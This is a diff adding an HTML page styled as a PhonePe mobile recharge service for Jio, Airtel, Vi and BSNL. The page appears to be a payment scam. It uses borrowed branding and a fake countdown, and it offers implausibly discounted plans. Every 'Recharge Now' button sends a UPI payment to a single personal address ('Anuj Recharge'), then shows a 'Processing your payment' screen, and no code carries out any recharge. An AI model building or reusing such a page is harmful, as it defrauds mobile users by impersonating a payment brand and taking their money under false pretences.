@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Recharge</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* General Body Styles */
+        body {
+            font-family: 'Inter', sans-serif;
+            margin: 0;
+            background-color: #f0f2f5;
+            color: #333;
+        }
+
+        .main-content {
+            padding: 20px 15px;
+        }
+
+        /* --- STYLES FOR PAGE 1: RECHARGE INPUT --- */
+
+        .header-image {
+            width: 100%; height: 50px; overflow: hidden; background-color: #fff;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05); display: flex; justify-content: center; align-items: center;
+        }
+        .header-image img { width: 100%; height: 100%; object-fit: contain; display: block; }
+        .image-banner { width: 100%; border-radius: 8px; overflow: hidden; margin-bottom: 20px; }
+        .image-banner img { width: 100%; height: auto; display: block; border-radius: 8px; }
+
+        .special-offer {
+            display: flex; align-items: center; justify-content: center; background-color: #ffe0b2; color: #e65100;
+            padding: 8px 15px; border-radius: 20px; font-size: 13px; font-weight: 500; margin-bottom: 20px;
+            width: fit-content; margin-left: auto; margin-right: auto;
+        }
+        .special-offer .timer-icon { margin-right: 5px; font-size: 16px; }
+        #countdown-timer { font-weight: 700; margin-left: 5px; }
+
+        .recharge-section { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+        .recharge-section .section-title {
+            display: flex; align-items: center; font-size: 18px; font-weight: 600;
+            margin-bottom: 20px; color: #444; justify-content: center;
+        }
+        .recharge-section .section-title span { font-size: 24px; color: #673ab7; margin-right: 8px; }
+
+        .network-selection { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; justify-content: space-between; }
+        .network-option { flex-basis: calc(50% - 5px); max-width: calc(50% - 5px); }
+        .network-option input[type="radio"] { display: none; }
+        .network-option label {
+            display: block; width: 100%; padding: 10px 0; text-align: center; border: 1px solid #ccc;
+            border-radius: 20px; cursor: pointer; font-size: 14px; font-weight: 500; color: #555;
+            transition: all 0.2s ease-in-out;
+        }
+        .network-option input[type="radio"]:checked + label { background-color: #673ab7; color: #fff; border-color: #673ab7; }
+
+        .mobile-input-container { margin-bottom: 25px; }
+        .mobile-input-container label { display: block; font-size: 14px; color: #666; margin-bottom: 8px; }
+        .mobile-number-input {
+            width: calc(100% - 24px); padding: 12px; border: 1px solid #ddd;
+            border-radius: 8px; font-size: 16px; color: #333;
+        }
+
+        /* --- STYLES FOR PAGE 2: PLANS LIST --- */
+        
+        .plans-header {
+            display: flex; align-items: center; justify-content: space-between; padding: 10px 15px;
+            background-color: #673ab7; color: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .plans-header-left { display: flex; align-items: center; }
+        .plans-header-logo { height: 28px; margin-right: 10px; }
+        .plans-header-text { font-size: 16px; font-weight: 500; }
+        .change-button {
+            background-color: transparent; border: 1px solid rgba(255, 255, 255, 0.5); color: #fff;
+            padding: 5px 10px; border-radius: 5px; font-size: 12px; cursor: pointer;
+        }
+
+        .section-heading {
+            font-size: 18px; font-weight: 600; color: #444; margin-bottom: 20px; text-align: center;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+        }
+        .section-heading .heading-new-tag {
+            background-color: #ff9800; color: #fff; font-size: 10px; font-weight: 700;
+            padding: 3px 6px; border-radius: 3px;
+        }
+
+        .plan-card { background-color: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 15px; padding: 15px; }
+        .plan-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 10px; }
+        .plan-new-tag-above-price {
+            background-color: #ff9800; color: #fff; font-size: 9px; font-weight: 700;
+            padding: 2px 5px; border-radius: 3px; margin-bottom: 5px; display: inline-block;
+        }
+        .plan-price-group { display: flex; flex-direction: column; align-items: flex-start; }
+        .plan-prices { display: flex; align-items: baseline; margin-top: 0; }
+        .plan-price-current { font-size: 24px; font-weight: 700; color: #333; margin-right: 8px; }
+        .plan-price-original { font-size: 14px; color: #999; text-decoration: line-through; }
+        .unlimited-5g-data-tag {
+            background-color: transparent; color: #ef5350; font-size: 11px; font-weight: 600;
+            padding: 2px 0px; border-radius: 3px; align-self: flex-start; white-space: nowrap;
+        }
+        .plan-details { display: flex; justify-content: space-between; margin-bottom: 15px; }
+        .detail-item { text-align: center; flex: 1; }
+        .detail-value { font-size: 15px; font-weight: 600; color: #333; margin-bottom: 3px; }
+        .detail-label { font-size: 12px; color: #777; }
+        
+        .recharge-button {
+            width: 100%; padding: 15px; background-color: #673ab7; color: #fff; border: none;
+            border-radius: 8px; font-size: 18px; font-weight: 600; cursor: pointer;
+            transition: background-color 0.2s ease-in-out; display: block; text-align: center;
+            box-sizing: border-box; text-decoration: none;
+        }
+        .recharge-button:hover { background-color: #5a2ea8; }
+        
+        .footer-banner { text-align: center; padding: 20px; margin-top: 30px; background-color: #f0f2f5; }
+        .footer-banner img { max-width: 100%; height: auto; border-radius: 8px; display: block; margin: 0 auto; }
+        #validationMessage { color: red; font-size: 14px; text-align: center; margin-top: -15px; margin-bottom: 15px; display: none; }
+        
+        /* --- STYLES FOR PAGE 3: PAYMENT PROCESSING --- */
+        .processing-page-body { display: flex; flex-direction: column; min-height: 100vh; background-color: #fff;}
+        .processing-header {
+            display: flex; justify-content: space-between; align-items: center; padding: 15px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05); width: 100%; box-sizing: border-box;
+        }
+        .processing-header-left { display: flex; align-items: center; }
+        .processing-menu-icon { font-size: 24px; margin-right: 15px; color: #673ab7; }
+        .processing-phonepe-logo img { height: 28px; }
+        .processing-profile-icon { width: 32px; height: 32px; background-color: #673ab7; border-radius: 50%; }
+        
+        .processing-main-content {
+            flex-grow: 1; display: flex; flex-direction: column; justify-content: center;
+            align-items: center; text-align: center; padding: 20px;
+        }
+        .loader {
+            border: 6px solid #f3f3f3; border-top: 6px solid #673ab7; border-radius: 50%;
+            width: 60px; height: 60px; animation: spin 1s linear infinite; margin-bottom: 40px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .processing-text-heading { font-size: 20px; font-weight: 600; color: #673ab7; margin-bottom: 15px; }
+        .info-text { font-size: 16px; color: #555; line-height: 1.5; }
+        .info-text p { margin: 5px 0; }
+
+    </style>
+</head>
+<body>
+
+    <!-- PAGE 1: ENTER MOBILE NUMBER (Initially visible) -->
+    <div id="rechargePage">
+        <div class="header-image">
+            <img src="https://i.supaimg.com/6696e00f-1745-4553-8771-4576354568fd.jpg" alt="Header Image">
+        </div>
+        <div class="main-content">
+            <div class="image-banner">
+                <img src="https://i.supaimg.com/ce61abad-e562-421b-8e6b-0cb4b33b3d77.png" alt="Recharge Banner Image">
+            </div>
+            <div class="special-offer">
+                <span class="timer-icon">&#9200;</span> Special Offer Ends In: <span id="countdown-timer">10:00</span>
+            </div>
+            <div class="recharge-section">
+                <div class="section-title"><span>&#x260E;</span> Mobile Recharge</div>
+                <div class="network-selection">
+                    <div class="network-option"><input type="radio" id="jio" name="network" value="jio" checked><label for="jio">Jio</label></div>
+                    <div class="network-option"><input type="radio" id="airtel" name="network" value="airtel"><label for="airtel">Airtel</label></div>
+                    <div class="network-option"><input type="radio" id="vi" name="network" value="vi"><label for="vi">VI</label></div>
+                    <div class="network-option"><input type="radio" id="bsnl" name="network" value="bsnl"><label for="bsnl">Bsnl</label></div>
+                </div>
+                <div class="mobile-input-container">
+                    <label for="mobileNumber">Mobile Number</label>
+                    <input type="tel" id="mobileNumber" class="mobile-number-input" placeholder="+91 XXXXX XXXXX" maxlength="10" required>
+                </div>
+                <div id="validationMessage">Please enter a valid 10-digit mobile number.</div>
+                <button id="proceedToRechargeBtn" class="recharge-button">Recharge</button>
+            </div>
+        </div>
+        <div class="footer-banner">
+            <img src="https://i.supaimg.com/37085507-e397-48d5-9cbe-4de646f6803e.jpg" alt="PhonePe Footer Banner Placeholder">
+        </div>
+    </div>
+
+    <!-- PAGE 2: VIEW PLANS (Initially hidden) -->
+    <div id="plansPage" style="display: none;">
+        <div class="plans-header">
+            <div class="plans-header-left">
+                <img src="https://i.supaimg.com/661e66ed-c832-4e40-a4dd-a11abc3dd36f.png" alt="Jio Logo" class="plans-header-logo">
+                <span id="plansHeaderNumber" class="plans-header-text">Recharge for: +91 XXXXX XXXXX</span>
+            </div>
+            <button id="changeNumberBtn" class="change-button">Change</button>
+        </div>
+        <div class="main-content">
+            <div class="section-heading"><span class="heading-new-tag">NEW!</span><span>RECHARGE & OFFERS</span></div>
+            
+            <!-- PLAN 1 -->
+            <div class="plan-card">
+                <div class="plan-header"><div class="plan-price-group"><span class="plan-new-tag-above-price">NEW!</span><div class="plan-prices"><span class="plan-price-current">₹99.00</span><span class="plan-price-original">₹299</span></div></div><div class="unlimited-5g-data-tag">UNLIMITED TRUE 5G DATA</div></div>
+                <div class="plan-details"><div class="detail-item"><div class="detail-value">28 Days</div><div class="detail-label">VALIDITY</div></div><div class="detail-item"><div class="detail-value">2 GB/day</div><div class="detail-label">DATA</div></div><div class="detail-item"><div class="detail-value">Unlimited</div><div class="detail-label">Voice</div></div><div class="detail-item"><div class="detail-value">100/day</div><div class="detail-label">SMS</div></div></div><div class="detail-item" style="text-align: left; margin-bottom: 15px;"><div class="detail-value">No OTT</div></div>
+                <a class="recharge-button" href="upi://pay?pa=anuj3480@axl&pn=Anuj%20Recharge&am=99&cu=INR" onclick="handlePayment(event)">Recharge Now</a>
+            </div>
+
+            <!-- PLAN 2 -->
+            <div class="plan-card">
+                <div class="plan-header"><div class="plan-price-group"><span class="plan-new-tag-above-price">NEW!</span><div class="plan-prices"><span class="plan-price-current">₹199.00</span><span class="plan-price-original">₹579</span></div></div><div class="unlimited-5g-data-tag">UNLIMITED TRUE 5G DATA</div></div>
+                <div class="plan-details"><div class="detail-item"><div class="detail-value">56 Days</div><div class="detail-label">VALIDITY</div></div><div class="detail-item"><div class="detail-value">2 GB/day</div><div class="detail-label">DATA</div></div><div class="detail-item"><div class="detail-value">Unlimited</div><div class="detail-label">Voice</div></div><div class="detail-item"><div class="detail-value">100/day</div><div class="detail-label">SMS</div></div></div><div class="detail-item" style="text-align: left;"><div class="detail-value">Amazon Music</div></div>
+                <a class="recharge-button" href="upi://pay?pa=anuj3480@axl&pn=Anuj%20Recharge&am=199&cu=INR" onclick="handlePayment(event)">Recharge Now</a>
+            </div>
+
+            <!-- PLAN 3 -->
+            <div class="plan-card">
+                <div class="plan-header"><div class="plan-price-group"><span class="plan-new-tag-above-price">NEW!</span><div class="plan-prices"><span class="plan-price-current">₹219.99</span><span class="plan-price-original">₹629</span></div></div><div class="unlimited-5g-data-tag">UNLIMITED TRUE 5G DATA</div></div>
+                <div class="plan-details"><div class="detail-item"><div class="detail-value">56 Days</div><div class="detail-label">VALIDITY</div></div><div class="detail-item"><div class="detail-value">2.5 GB/day</div><div class="detail-label">DATA</div></div><div class="detail-item"><div class="detail-value">Unlimited</div><div class="detail-label">Voice</div></div><div class="detail-item"><div class="detail-value">100/day</div><div class="detail-label">SMS</div></div></div><div class="detail-item" style="text-align: left; margin-bottom: 15px;"><div class="detail-value">OTT + Music</div></div>
+                <a class="recharge-button" href="upi://pay?pa=anuj3480@axl&pn=Anuj%20Recharge&am=219.99&cu=INR" onclick="handlePayment(event)">Recharge Now</a>
+            </div>
+
+            <!-- PLAN 4 -->
+            <div class="plan-card">
+                <div class="plan-header"><div class="plan-price-group"><span class="plan-new-tag-above-price">NEW!</span><div class="plan-prices"><span class="plan-price-current">₹249.00</span><span class="plan-price-original">₹799</span></div></div><div class="unlimited-5g-data-tag">UNLIMITED TRUE 5G DATA</div></div>
+                <div class="plan-details"><div class="detail-item"><div class="detail-value">90 Days</div><div class="detail-label">VALIDITY</div></div><div class="detail-item"><div class="detail-value">2 GB/day</div><div class="detail-label">DATA</div></div><div class="detail-item"><div class="detail-value">Unlimited</div><div class="detail-label">Voice</div></div><div class="detail-item"><div class="detail-value">100/day</div><div class="detail-label">SMS</div></div></div><div class="detail-item" style="text-align: left; margin-bottom: 15px;"><div class="detail-value">Netflix + Prime</div></div>
+                <a class="recharge-button" href="upi://pay?pa=anuj3480@axl&pn=Anuj%20Recharge&am=249&cu=INR" onclick="handlePayment(event)">Recharge Now</a>
+            </div>
+
+            <!-- PLAN 5 -->
+            <div class="plan-card">
+                <div class="plan-header"><div class="plan-price-group"><span class="plan-new-tag-above-price">NEW!</span><div class="plan-prices"><span class="plan-price-current">₹599.00</span><span class="plan-price-original">₹2849</span></div></div><div class="unlimited-5g-data-tag">UNLIMITED TRUE 5G DATA</div></div>
+                <div class="plan-details"><div class="detail-item"><div class="detail-value">365 Days</div><div class="detail-label">VALIDITY</div></div><div class="detail-item"><div class="detail-value">3 GB/day</div><div class="detail-label">DATA</div></div><div class="detail-item"><div class="detail-value">Unlimited</div><div class="detail-label">Voice</div></div><div class="detail-item"><div class="detail-value">100/day</div><div class="detail-label">SMS</div></div></div><div class="detail-item" style="text-align: left; margin-bottom: 15px;"><div class="detail-value">Disney+ Hotstar + SonyLIV</div></div>
+                <a class="recharge-button" href="upi://pay?pa=anuj3480@axl&pn=Anuj%20Recharge&am=599&cu=INR" onclick="handlePayment(event)">Recharge Now</a>
+            </div>
+
+        </div>
+        <div class="footer-banner"><img src="https://i.supaimg.com/ff7970a0-66e0-4106-9b7e-4eead29979c8.png" alt="PhonePe Footer Banner"></div>
+    </div>
+
+    <!-- PAGE 3: PAYMENT PROCESSING (Initially hidden) -->
+    <div id="paymentProcessingPage" style="display: none;" class="processing-page-body">
+        <div class="processing-header">
+            <div class="processing-header-left">
+                <div class="processing-menu-icon">&#9776;</div>
+                <div class="processing-phonepe-logo"><img src="https://i.supaimg.com/f0406d48-356c-411a-8e24-4f40f2526c8c.png" alt="PhonePe Logo"></div>
+            </div>
+            <div class="processing-profile-icon"></div>
+        </div>
+        <div class="processing-main-content">
+            <div class="loader"></div>
+            <div class="processing-text-heading">Processing your payment...</div>
+            <div class="info-text">
+                <p>Please complete the payment in your UPI app</p>
+                <p>Please do not close this page</p>
+                <p>Your payment is being processed securely</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- SCRIPT FOR ALL PAGES ---
+
+        document.addEventListener('DOMContentLoaded', function () {
+            // Get all page elements
+            const rechargePage = document.getElementById('rechargePage');
+            const plansPage = document.getElementById('plansPage');
+            const paymentProcessingPage = document.getElementById('paymentProcessingPage');
+            
+            // Get interactive elements from Page 1
+            const proceedToRechargeBtn = document.getElementById('proceedToRechargeBtn');
+            const mobileNumberInput = document.getElementById('mobileNumber');
+            const validationMessage = document.getElementById('validationMessage');
+
+            // Get interactive elements from Page 2
+            const changeNumberBtn = document.getElementById('changeNumberBtn');
+            const plansHeaderNumber = document.getElementById('plansHeaderNumber');
+
+            // --- Event Listeners ---
+
+            // Event listener for the "Recharge" button on Page 1
+            proceedToRechargeBtn.addEventListener('click', function() {
+                const mobileNumber = mobileNumberInput.value;
+                if (mobileNumber.length === 10 && /^\d{10}$/.test(mobileNumber)) {
+                    plansHeaderNumber.textContent = `Recharge for: +91 ${mobileNumber}`;
+                    rechargePage.style.display = 'none';
+                    plansPage.style.display = 'block';
+                    validationMessage.style.display = 'none';
+                } else {
+                    validationMessage.style.display = 'block';
+                }
+            });
+
+            // Event listener for the "Change" button on Page 2
+            changeNumberBtn.addEventListener('click', function() {
+                plansPage.style.display = 'none';
+                paymentProcessingPage.style.display = 'none'; // Also hide processing page
+                rechargePage.style.display = 'block';
+                mobileNumberInput.value = '';
+            });
+
+            // --- Countdown Timer ---
+            const countdownElement = document.getElementById('countdown-timer');
+            let totalSeconds = 10 * 60; 
+            function updateCountdown() {
+                const minutes = Math.floor(totalSeconds / 60);
+                const seconds = totalSeconds % 60;
+                countdownElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                if (totalSeconds > 0) {
+                    totalSeconds--;
+                } else {
+                    clearInterval(countdownInterval);
+                    countdownElement.textContent = "00:00";
+                }
+            }
+            updateCountdown();
+            const countdownInterval = setInterval(updateCountdown, 1000);
+        });
+
+        // --- Global function to handle payment ---
+        function handlePayment(event) {
+            event.preventDefault(); // Stop the default link action
+
+            const upiLink = event.target.href;
+            
+            // Hide plans page and show processing page
+            document.getElementById('plansPage').style.display = 'none';
+            document.getElementById('paymentProcessingPage').style.display = 'flex'; // Use flex to align content correctly
+
+            // Redirect to UPI app. 
+            // The browser will show this processing page while the user is in the UPI app.
+            window.location.href = upiLink;
+        }
+    </script>
+
+</body>
+</html>
